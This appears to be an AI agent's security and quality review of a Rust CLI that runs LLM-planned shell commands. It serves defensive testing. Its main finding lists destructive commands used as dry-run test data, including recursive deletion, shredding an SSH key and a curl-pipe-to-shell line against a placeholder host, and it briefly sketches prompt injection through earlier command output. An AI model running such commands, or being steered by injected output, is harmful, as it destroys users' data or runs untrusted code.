---
title: "Code Review 00001: Main Current Code State"
aliases:
  - "Review 00001"
tags:
  - code-review
  - software-quality
  - claude-code
type: code-review
status: open                 # open | addressed | superseded
review_id: "00001"
reviewed_at: "2026-09-20T19:37:41Z"
reviewer_agent: "Claude Code"
review_model: "anthropic/claude-fable-5-1"
triggered_by: "user"         # user | agent:<agent-name>
review_kind: initial         # initial | re-review
previous_review: null
repository: "joelee/cli-bot"
branch: "main"
review_mode: repository      # pull-request | branch | commit | range | working-tree | repository
pr_reference: null
commit: "7c41d822b492064227e81336f393673618919320"
base_ref: null
base_commit: null
head_ref: "main"
head_commit: "7c41d822b492064227e81336f393673618919320"
scope: "whole repository at main: src/, tests/, justfile, scripts/, .github/workflows/, config template, and the rule and developer documents"
related_plan: "docs/plans/00001-Rules_Alignment_And_Justfile.md"
files_changed: null
files_reviewed: 35
diff_additions: null
diff_deletions: null
blocking_issues: 1
issues:
  critical: 0
  major: 1
  medium: 8
  low: 7
  info: 2
  total: 18
categories:
  security: 3
  correctness: 6
  reliability: 2
  tests: 2
  documentation: 2
  maintainability: 3
verdict: request-changes     # approve | approve-with-comments | request-changes | incomplete
review_complete: true
web_research_used: false
confidence: high             # high | medium | low
sources: []
---

# Code Review 00001: Main Current Code State

> [!abstract] Verdict: `request-changes`
> The tooling and release pipeline on `main` are in good order and every gate
> passes, but the product's safety gate lets most destructive commands run
> with no confirmation, which should be fixed before the next release.

## Review target

| Field | Value |
|---|---|
| Review mode | Repository (whole code state) |
| PR or commit | `7c41d822b492064227e81336f393673618919320` ("Updating to new DevOps process.") |
| Base | Not applicable |
| Head | `main`, equal to `origin/main`, clean working tree |
| Branch | `main` |
| Triggered by | User, before planning the iteration after v0.3.2 |
| Related plan | `docs/plans/00001-Rules_Alignment_And_Justfile.md` (completed) |

Bounded focus: all nine files under `src/`, `tests/mock_ollama.rs`, the
`justfile`, the three scripts, the four workflows, `deny.toml`, the config
template `cli-bot.toml`, and the rule and developer documents. The user and
reference documents (`README.md`, `docs/usage.md`, and similar) were checked
only where a finding depends on them. The two older benchmark reports and
`LICENSE` were not reviewed.

## Executive summary

cli-bot v0.3.2 is a single-crate Rust CLI of about 5,500 lines that asks an
Ollama model for a JSON plan of shell commands and runs the selected one
through `/bin/sh -c`. Since PLAN-00001 the repository has one task runner,
a pinned toolchain, an enforced 80% coverage gate (88.93% today), a
supply-chain audit, a link check, and a tag-driven release workflow. Those
parts are careful work; `just ci` passes cleanly.

The main risk is in the product itself. A command runs immediately, with no
prompt, unless the model sets `potentially_destructive` or the command text
contains one of 19 literal substrings. In a dry-run experiment 12 of 14
plainly destructive commands, including `rm -fr ~/projects`, were classed as
needing no confirmation. The README presents this gate as the safety model
and names newcomers as an audience, and the default model is a 9B local
model. That is one Major finding.

The eight Medium findings are reliability and correctness defects that a
user will meet in normal use: a fixed 30-second HTTP timeout that failed 11
of 35 calls in the project's own benchmark report; one unreadable session
file that stops every invocation, including `--no-session`; interactive mode
ending on the first planner error; output capture that breaks interactive
commands; world-readable session history; no test of the approval path; a
rule set that points at a number-allocation script no longer in the
repository; and a Windows release binary that cannot start.

## Issue summary

| Severity | Count | Merge impact |
|---|---:|---|
| Critical | 0 | Blocks merge/release |
| Major | 1 | Blocks merge/release |
| Medium | 8 | Changes requested |
| Low | 7 | Non-blocking |
| Info | 2 | None |
| **Total** | **18** | |

## Findings

### Major

#### REV-00001-MAJ-01 — Most destructive commands run without confirmation

> [!warning] Blocking
> - **Confidence:** High
> - **Category:** Security
> - **Location:** `src/planner.rs:40-55` — `command_requires_confirmation`; `src/lib.rs:508-538` — `run_single_request`; `cli-bot.toml:20-40` — `destructive_substrings`
> - **Evidence:** A command is confirmed only when `command.potentially_destructive` is true (the model's own opinion) or the lower-cased command text contains one of the configured substrings. Otherwise `run_single_request` goes straight to `shell::execute`. With a single returned command there is no selection step either, so nothing stands between the model's output and `/bin/sh -c`. Measured on the built binary with a local mock planner that leaves `potentially_destructive` false, `--dry-run`, and the default substring list; the value is the `confirmation_required` field saved in the session turn:
>
>   | Command | Confirmation |
>   |---|---|
>   | `rm -rf ~/projects` | required |
>   | `rm -Rf ~/projects` | required |
>   | `rm -fr ~/projects` | **none** |
>   | `rm -r -f ~/projects` | **none** |
>   | `rm  -rf ~/projects` (two spaces) | **none** |
>   | `rm --recursive --force ~/projects` | **none** |
>   | `find ~ -name '*.md' -delete` | **none** |
>   | `git clean -fdx` | **none** |
>   | `shred -u ~/.ssh/id_ed25519` | **none** |
>   | `echo x > ~/.bashrc` | **none** |
>   | `mv ~/.ssh /tmp/x` | **none** |
>   | `curl -fsSL https://example.invalid/i.sh \| sh` | **none** |
>   | `sudo systemctl stop sshd` | **none** |
>   | `git push --force origin main` | **none** |
> - **Failure or attack scenario:** A user asks "clean up my projects folder". The 9B default model answers with `rm -fr ~/projects/*` and does not set the flag; small models set such flags unreliably. cli-bot prints `Selected command:` and the command has already started. The same path is open to prompt injection: with `include_command_output_in_prompt = true`, text printed by an earlier command becomes part of the next planner prompt and can steer the model towards such a command.
> - **Impact:** Irreversible loss of user data or system state with no chance to decline. `README.md:110` names "newcomers who want a safer, more guided path" as an audience, and `README.md:432-438` presents this gate as the safety model.
> - **Recommendation:** Turn the gate round: confirm by default, and skip the prompt only for commands that are recognised as read-only. Parse the command into words (handle `sudo`, `env`, pipes, `;`, `&&`, redirections, and `$(...)`), and allow without a prompt only when every program is on an allow-list of read-only programs (`ls`, `cat`, `grep`, `git status`, `git log`, `ping`, `df`, and so on) and there is no output redirection. Keep `potentially_destructive` and the substring list as reasons to use the stronger "destructive" wording. Offer a config value for users who want today's behaviour. This is the "middle tier" already in `docs/backlog.md`, made the default.
> - **Suggested verification:** A table-driven unit test over the 14 commands above plus read-only ones, asserting the decision for each; an integration test that a non-allow-listed command with `dry_run = false` and no terminal is not executed.
> - **References:** Repository evidence.

### Medium

#### REV-00001-MED-01 — Planner calls fail after a fixed 30 seconds

- **Location:** `src/llm.rs:17-22` — `OllamaClient::new`
- **What:** The client is `reqwest::blocking::Client::new()`, whose default total timeout is 30 seconds, and no config key changes it.
- **Why it matters:** Loading a model that is not resident, or any model above about 25B parameters on this class of hardware, takes longer. The request then fails with `operation timed out` although Ollama is still working. The project's own report, `docs/models-benchmark-report-v0.3.2.md`, records 11 failures in 35 calls, and all 11 are this timeout (`muse-glimmer:latest` 6 of 7, `nemotron-3.5-lightning:30b` 4 of 7). That report is cited in `README.md:455` as the basis for the default model, so the timeout also distorts the ranking: it measures "answers within 30 s", not answer quality.
- **Evidence:**
  ```text
  docs/models-benchmark-report-v0.3.2.md:140
  failed to call Ollama: error sending request for url
  (http://127.0.0.1:11434/api/chat): operation timed out
  ```
- **Suggested fix:** Add `[ollama] request_timeout_seconds` (default about 300; `0` for none) and a short, separate connect timeout so an unreachable server still fails fast. Use a longer value in `--models-benchmark`, and show the timeout in the report header.

#### REV-00001-MED-02 — One unreadable session file stops every invocation

- **Location:** `src/lib.rs:118-119` — `run`; `src/session.rs:157-208` — `prune_expired`; `src/session.rs:63-117` — `list`; `src/session.rs:138` — `save`
- **What:** `run` calls `prune_expired()?` before looking at any flag. `prune_expired` parses every `*.json` in the sessions folder and returns the first read or parse error. `save` writes with `fs::write`, which truncates the file first, so an interrupted write, a full disk, two cli-bot processes saving the same session, or a hand edit (which `docs/session-memory.md` invites) leaves such a file.
- **Why it matters:** From then on every command fails, including the ones a user would reach for to recover. Measured with a truncated `other.json` beside a valid config:
  ```text
  [--check]                 Error: failed to parse session file ... exit=1
  [--no-session -n hello]   Error: failed to parse session file ... exit=1
  [--session-clear]         Error: failed to parse session file ... exit=1
  [--session-list]          Error: failed to parse session file ... exit=1
  ```
  The only way out is to find and delete the file by hand. The default template sets `retention_days = 14`, so pruning is on for everyone.
- **Suggested fix:** In `prune_expired` and `list`, skip a file that cannot be read or parsed and report it in verbose output (or move it aside as `*.corrupt`). Do not prune when the invocation does not use sessions. Write atomically: write to a temporary file in the same folder, then `rename`.

#### REV-00001-MED-03 — Interactive mode ends on the first planner error

- **Location:** `src/lib.rs:1594-1616` — `interactive_prompt_cancelled`, `handle_interactive_request_error`; `src/lib.rs:1535-1558` — `prompt_for_request`
- **What:** Error kinds are recognised by matching message text. Only an error containing `command exited with status` keeps the loop alive; every other error is returned and ends the session. Any error containing `failed to capture request from terminal` is treated as the user pressing Ctrl-C.
- **Why it matters:** The errors that end the session are the common ones with small local models: a timeout (MED-01), a reply without JSON, an empty command list. One bad reply throws the user out of the session. Measured: with the planner unreachable, `printf 'first\nsecond\n' | cli-bot -i` prints `Error: failed to call Ollama` and exits 1 without reading the second request. With piped input the loop also ends with `Error: request must not be empty` and exit 1 at end of input, instead of exiting 0. Rewording either message would silently change behaviour, and a unit test (`src/lib.rs:1979-1995`) pins the text matching in place.
- **Suggested fix:** A small error enum (`Cancelled`, `CommandFailed { status }`, `Planner`, `Fatal`) carried through `anyhow` with `downcast_ref`. In interactive mode print planner errors and prompt again; keep fatal errors (config, terminal lost) as exits. Treat end of input as a normal exit.

#### REV-00001-MED-04 — Output capture breaks interactive commands

- **Location:** `src/shell.rs:22-47` — `execute`
- **What:** With `session_memory.capture_command_output = true` the command runs through `Command::output()`. Its standard input is not the terminal (reads see end of file), its output is not a terminal, and nothing is shown until the command has finished.
- **Why it matters:** Editing a file in the preferred editor is a headline feature (`preferred_editor`, the prompt text in `src/llm.rs`). With capture on, `nvim notes.md`, `sudo ...` (password prompt), `less`, `top`, and `ssh` cannot work, and long commands such as `ping -c 5` show no progress. Neither `docs/configuration.md` nor `docs/session-memory.md` mentions this.
- **Evidence:**
  ```rust
  let output = Command::new(&config.shell)
      .arg(&config.shell_arg)
      .arg(command)
      .output()
  ```
- **Suggested fix:** Keep standard input inherited, and copy the child's output to the terminal while collecting up to `max_output_bytes` (two reader threads, or a pseudo-terminal). As a smaller step, skip capture when the command starts with the preferred editor or another known full-screen program, and document the limit.

#### REV-00001-MED-05 — Session history is readable by other local users

- **Location:** `src/session.rs:131-139` — `save`
- **What:** The sessions folder and files are created with default permissions. Measured with umask `0022`: folder `755`, `default.json` `644`.
- **Why it matters:** The files hold every request, the selected commands, working directories, and, when capture is on, command output. Requests and commands often contain host names, paths, and tokens. Shells keep the equivalent history file at `600`. On a shared machine any user can read `~/.local/state/cli-bot/sessions/`.
- **Suggested fix:** On Unix create the folder with mode `0700` and files with `0600` (`OpenOptions` with `mode`), and tighten existing ones when they are next written. Combine with the atomic write of MED-02.

#### REV-00001-MED-06 — The approval and selection paths have no test

- **Location:** `src/lib.rs:508-535` (approval), `src/lib.rs:1633-1673` — `select_command`; `src/lib.rs:343-357` — `run_single_request` signature
- **What:** `Confirm::new()` and `Select::new()` from `dialoguer` are called directly inside the request flow. A test cannot answer them, and a test run from a terminal would open a real prompt, so `AGENTS.md` forbids tests from reaching them. As a result no test shows that a declined command is not executed, that an approved one is, or that a chosen alternative is the one that runs.
- **Why it matters:** This is the code that MAJ-01 will change, and it is the product's main safety behaviour. It makes up most of the 422 uncovered lines. `run_single_request` also takes 13 arguments, which is what makes injecting a prompt awkward today.
- **Suggested fix:** A `Prompter` trait (`confirm`, `select`, `read_request`) with the `dialoguer` implementation for production and a scripted one for tests, passed in a request-context struct that replaces the 13 arguments. Then add integration tests: declined means not executed and no `executed: true` turn; approved means executed; selection of the second choice runs the second command.

#### REV-00001-MED-07 — The rules point at a number-allocation script that is not in the repository

- **Location:** `AGENTS.md:88`; `docs/developer-guide.md` (Workflow, step 2); `docs/plans/AGENTS.md`, `docs/ideas/AGENTS.md`, `docs/reviews/AGENTS.md` (file naming sections)
- **What:** Commit `7c41d82` removed `.agents/skills/allocating-report-numbers/` from version control. `.agents` and `.opencode` are now ignored through `.git/info/exclude`, which is local to one clone, and hold symlinks to absolute paths under `/home/joel/Projects/GitHub/opencode-template/`. In this clone `.agents/skills/` links only `conduct-deep-research` and `write-research-report`; the allocation skill is not linked. Five tracked documents still tell the writer to run `.agents/skills/allocating-report-numbers/allocate-report.sh`, and the three directory guides forbid allocating a number any other way.
- **Why it matters:** Following the rules as written fails with "No such file or directory" for plans, ideas, and reviews. This review met it: its number was allocated with the identical script in `opencode-template/skills/`, after checking with `diff` that it matches the removed file. A fresh clone, or CI, has neither the script nor the agent definitions the guides call normative.
- **Suggested fix:** Either track the script again (it is 84 lines and has no dependency), or add the missing symlink and have `just setup` create the links, with the documents saying where the skills come from. `just check` could verify that every script path named in the rule documents exists.

#### REV-00001-MED-08 — The Windows release binary cannot start

- **Location:** `.github/workflows/release.yml:50-51`, `:78-91` (Windows build and zip); `deny.toml:9`; `src/config.rs:38-66`, `src/session.rs:451-473`, `cli-bot.toml:49`, `src/environment.rs:20-25`
- **What:** The Release workflow builds and attaches `cli-bot-<version>-x86_64-pc-windows-msvc.zip`. The program resolves its config only through `HOME` (normally unset on Windows) and `/etc/cli-bot.toml`; the session store needs `HOME` or `XDG_STATE_HOME` and is consulted on every run (MED-02); the default shell is `/bin/sh`; and `OperatingSystem` has no Windows value.
- **Why it matters:** The first release made by this workflow will publish a download that fails on first run with `no config file found`, or with `HOME is not set` once a config is given, and that cannot execute anything through `/bin/sh`. Nothing in `README.md` claims Windows support, so the artifact is the only place the claim is made.
- **Suggested fix:** Remove the Windows entry from the release matrix and from `deny.toml` `targets` until Windows is supported, and add Windows support as a backlog item (`USERPROFILE`/`APPDATA` paths, `cmd` or PowerShell as the shell, an OS value, a CI job).

### Low

#### REV-00001-LOW-01 — A failed command loses its exit status, reads oddly, and is not remembered

- **Location:** `src/shell.rs:38-40`, `:56-58`; `src/main.rs:9-12`; `src/lib.rs:538-559`
- **What / Why:** A command that exits 3 makes cli-bot print `Error: command exited with status exit status: 3` (the word "status" twice, because `ExitStatus` already prints `exit status: 3`) and exit 1, so scripts cannot see the real status. Because `execute` returns an error, the turn is never saved, and a follow-up such as "why did that fail" has no context. Measured: exit code 1 and an empty sessions folder.
- **Suggested fix:** Return the `ExecutionResult` for a non-zero exit, save the turn with its status, print `command exited with status 3`, and exit with the child's code.

#### REV-00001-LOW-02 — Session file names depend on an unspecified hash

- **Location:** `src/session.rs:476-480` — `stable_path_hash`
- **What / Why:** Working-directory sessions are named `<name>-<hash>.json` with `std::collections::hash_map::DefaultHasher`. The standard library documents that its algorithm may change between releases. After such a toolchain change, a new cli-bot build computes other names; existing sessions are orphaned until they expire.
- **Suggested fix:** A fixed algorithm (FNV-1a in a few lines, or SHA-256 if a dependency is acceptable). On load, fall back to the old name once and rename the file.

#### REV-00001-LOW-03 — The default config template carries the maintainer's own settings

- **Location:** `src/config.rs:11`, `:78-105` — `DEFAULT_CONFIG_TEMPLATE`, `create_default_user_config`; `cli-bot.toml:51`, `:68-77`; `src/config.rs:288-306` — `is_known_editor_in_path`
- **What / Why:** The file written to `~/.config/cli-bot/cli-bot.toml` on first run is the repository's own `cli-bot.toml`. It sets `preferred_editor = "nvim"`, which overrides `$EDITOR` and makes `cli-bot --check` fail with `editor: error` on any machine without Neovim. It also lists eight benchmark models up to `nemotron-3-super:120b`, so `--models-benchmark` on a fresh install tries to load about 250 GB of models. An editor value with arguments, such as `code --wait`, is looked up as one file name and is reported missing.
- **Suggested fix:** Ship a separate template: no `preferred_editor` (fall back to `$EDITOR`), and a benchmark list of only the default model. Check only the first word of the editor value. Report a missing editor in `--check` as a warning, because nothing else depends on it.

#### REV-00001-LOW-04 — `--check` needs the exact model tag

- **Location:** `src/llm.rs:272-277` — `check_service`
- **What / Why:** `model.name == self.config.model` compares the configured name with Ollama's listed names, which always carry a tag. A config of `model = "gemma4"` works for requests, since Ollama assumes `:latest`, but `--check` reports the model as missing.
- **Suggested fix:** When the configured name has no `:`, compare against `<name>:latest` as well.

#### REV-00001-LOW-05 — The release workflow gives every job write access and uses movable action references

- **Location:** `.github/workflows/release.yml:12-13`, `:110`, `:113`
- **What / Why:** `permissions: contents: write` is set for the whole workflow, although only the final `release` job creates a release. The `crates` job, which receives `CARGO_REGISTRY_TOKEN`, installs its toolchain with `dtolnay/rust-toolchain@master` and uses `Swatinem/rust-cache@v2`; both are movable references. A changed action could alter the `cargo` binary that then runs with the token. The `release` environment approval limits when this can happen, not what runs.
- **Suggested fix:** Set `contents: read` at the top and `contents: write` on the `release` job only. In `release.yml`, pin third-party actions to commit hashes with the version in a comment, and drop the cache from the `crates` job.

#### REV-00001-LOW-06 — Documents that no longer match the code state

- **Location:** `docs/usage.md:66`; `docs/session-memory.md:3`, `:262`; `docs/backlog.md:82-84`; `.env.sample`
- **What / Why:** `docs/usage.md` and `docs/session-memory.md` say session memory arrived "in `0.3.1`", a version that was never published; it shipped in 0.3.0 according to `CHANGELOG.md`. The backlog item on stale benchmark reports names two files, and there are now three (`models-benchmark-report-v0.3.2.md` was added beside them). `CHANGELOG.md` mixes two heading styles, `## [0.3.2] - <date>` and the new `## vX.Y.Z - <UTC timestamp>` that `scripts/check-release-tag.sh` requires; the next release will need the new one, and the file's intro still says "based on Keep a Changelog".
- **Suggested fix:** Correct the version wording, move the reports under `docs/benchmarks/` and update the backlog item, and add a line to `CHANGELOG.md` saying that headings changed format from v0.3.3.

#### REV-00001-LOW-07 — Integration tests leave their temporary folders behind

- **Location:** `tests/mock_ollama.rs:1080-1088` — `unique_temp_dir`, and its 30 callers
- **What / Why:** Each test creates one or two folders under the system temporary directory and never removes them. Every `just check` runs the tests twice, so each commit leaves about 60 folders; a busy day leaves thousands.
- **Suggested fix:** A small guard type that removes the folder on `Drop`, returned by `unique_temp_dir`; or the `tempfile` crate as a dev-dependency.

### Info

#### REV-00001-INFO-01 — The published crate carries repository records

`Cargo.toml` has no `include` or `exclude`. `cargo package --list` shows 53
files, of which 26 are documents, workflows, and scripts, including
`docs/plans/`, `docs/reviews/`, and three benchmark reports. Only `src/`,
`cli-bot.toml` (embedded with `include_str!`), `README.md`, `LICENSE`,
`CHANGELOG.md`, and the Cargo files are needed. An `include` list would keep
future records out of the crate.

#### REV-00001-INFO-02 — The benchmark host section misreports unified-memory GPUs

`detect_linux_gpu_vram` (`src/lib.rs:1467-1487`) reads
`mem_info_vram_total`, which on an APU is the small fixed carve-out. The
v0.3.2 report therefore shows `GPU VRAM: 0.5 GiB` on a machine with 125 GiB
of unified memory. Reading `mem_info_gtt_total` as well, or labelling the
value "dedicated VRAM", would avoid misleading readers of published reports.

## Open questions

- **Thinking models.** `extract_json_document` (`src/llm.rs:568-573`) takes
  the text from the first `{` to the last `}`. With `use_chat_api = false`
  there is no `format: json`, and a model that prints reasoning containing
  braces before its answer would fail to parse. Whether any listed model
  does this through `/api/generate` on Ollama 0.32 was not tested. A run of
  `--models-benchmark` with `use_chat_api = false` would answer it.
- **Release environment.** `docs/backlog.md` says the `release` GitHub
  environment, its reviewer, and the `CARGO_REGISTRY_TOKEN` secret still
  need to be created. Whether the environment is restricted to `v*` tags, as
  the comment in `release.yml:103-105` states, can only be seen in the
  repository settings.
- **Action versions.** `release.yml` uses `actions/checkout@v7`,
  `upload-artifact@v7`, and `download-artifact@v8`, while the other three
  workflows use `checkout@v4` and `upload-artifact@v4`. `actionlint` accepts
  both. The Release workflow has not run in this repository yet (v0.3.2 was
  published before it existed), so its first run is its first real test.

## Review coverage

### Files and areas reviewed

- `src/lib.rs`, `src/llm.rs`, `src/config.rs`, `src/session.rs`,
  `src/environment.rs`, `src/planner.rs`, `src/shell.rs`, `src/output.rs`,
  `src/main.rs`: all production code, read in full
- `tests/mock_ollama.rs`: in full
- `justfile`, `scripts/check-links.sh`, `scripts/check-release-tag.sh`,
  `scripts/update-homebrew-formula.sh`, `.githooks/pre-commit`,
  `.pre-commit-config.yaml`, `deny.toml`, `rust-toolchain.toml`,
  `Cargo.toml`, `cli-bot.toml`, `.env.sample`, `.config/nextest.toml`
- `.github/workflows/release.yml`, `release-checks.yml`,
  `unit-coverage.yml`, `coverage-pages.yml`
- `AGENTS.md`, `docs/developer-guide.md`, `docs/backlog.md`,
  `docs/testing.md`, `CHANGELOG.md`; and, where a finding depends on them,
  `README.md`, `docs/usage.md`, `docs/session-memory.md`,
  `docs/configuration.md`, `docs/models-benchmark-report-v0.3.2.md`
- The diff `8093616..7c41d82` (29 files), which holds the user's changes
  since the v0.3.2 merge

### Checks performed

- `just ci` on the reviewed commit: exit 0. 118 tests pass (91 unit, 27
  integration); line coverage 88.93% (3813 lines, 422 missed); `cargo deny`:
  advisories, bans, licences, and sources ok; links ok in 22 Markdown files;
  publish dry run and `actionlint` pass.
- Five experiments on the built debug binary, each with a throwaway config,
  a temporary session folder, and a local mock planner, never a real model:
  the confirmation decision for 14 commands under `--dry-run` (MAJ-01); a
  truncated session file (MED-02); interactive mode with piped input and
  with the planner unreachable (MED-03); a command exiting 3 (LOW-01);
  permissions of the files written (MED-05). No destructive command was
  executed; the only commands run through cli-bot were `exit 3` and dry runs.
- `cargo package --list` for INFO-01; `diff` of the removed allocation
  script against the copy used (MED-07).
- Static reasoning for MED-01 (timeout default; the 11 failures were read in
  the report), MED-04, MED-08, LOW-02, LOW-04, and LOW-05.

### Checks not performed

- No request was sent to a real Ollama service, and no model behaviour was
  measured.
- Nothing was run on macOS or Windows; MED-08 rests on reading the code.
- The Release workflow was not run. GitHub repository settings (branch
  protection, environments, secrets) were not inspected.
- MED-04 was not reproduced with a real editor, because the review shell has
  no terminal.
- `docs/models-benchmark-report.md`, `docs/models-benchmark-report1.md`,
  `docs/homebrew.md`, `docs/install-ollama.md`, `docs/installation.md`,
  `docs/architecture.md`, and `LICENSE` were not reviewed.

## Positive notes

- Every failure path found fails closed: without a terminal, approval and
  selection return an error and nothing is executed.
- Session names are validated against `[A-Za-z0-9._-]` with a length limit,
  so `--session ../x` cannot leave the sessions folder.
- The planner prompt tells the model to mark ambiguous requests unresolved,
  and the text fallback is told not to invent command results.
- Unit tests pass paths, the environment, and `os-release` text in as
  arguments instead of reading the real ones.
- The release pipeline orders its steps so the irreversible one, publishing
  to crates.io, happens after the tag check, the dry run, the binaries, and
  a human approval, and the GitHub release is created only after it
  succeeds. `check-release-tag.sh` and `check-links.sh` report every problem
  before failing.

## External references

None.

## Recommended next actions

1. **MAJ-01** with **MED-06**: introduce the `Prompter` seam and the request
   context first, then change the confirmation policy test-first with the
   command table from MAJ-01. These two belong in one plan.
2. **MED-02** and **MED-05** together: tolerant pruning and listing, atomic
   writes, owner-only permissions.
3. **MED-01**: configurable timeouts; then regenerate the benchmark report,
   since the current ranking reflects the timeout.
4. **MED-03** with **LOW-01**: typed errors, interactive mode that survives
   planner errors, real exit codes, failed turns saved.
5. **MED-07** and **MED-08**: small changes, no code risk; suitable for the
   start of the next branch.
6. **MED-04**, then the Low findings as capacity allows.

## Handoff

This is an initial review; there is no earlier review to reconcile. The
user asked for it as input to planning the iteration after v0.3.2. The
next step is a delivery plan in `docs/plans/` that names this report in
`source_reviews` and cites finding IDs in its requirements. This report's
`status` moves to `addressed` once MAJ-01 is fixed. `docs/backlog.md`
already lists MED-01, MED-03, LOW-01, LOW-02, and part of MAJ-01 and MED-06
from the handover on 2026-09-17; the plan should remove those items as it
completes them, and MED-02, MED-04, MED-05, MED-07, MED-08, LOW-03 to
LOW-07 are new and should be added to the backlog if they are not planned.

## Confidence

**High.** All production code and tests were read in full, the full check
suite was run on the reviewed commit, and the Major finding and four others
were reproduced on the built binary rather than inferred. The principal
uncertainty is platform behaviour: nothing was run on macOS or Windows, and
the Release workflow has never executed in this repository.
